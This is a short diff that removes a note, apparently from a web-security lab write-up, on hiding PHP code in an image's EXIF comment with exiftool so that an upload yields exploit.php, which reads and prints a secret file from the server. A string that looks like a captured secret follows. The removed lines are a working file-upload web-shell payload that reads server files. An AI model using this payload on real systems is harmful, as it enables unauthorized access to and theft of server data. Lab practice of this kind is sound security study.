@@ -1,4 +1,0 @@
-Using exfitool we will put the php command in the image :
-exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.png -o exploit.php
-
-5RNfjL20DQ9YOilwsdDra2e8P0XYpsUL
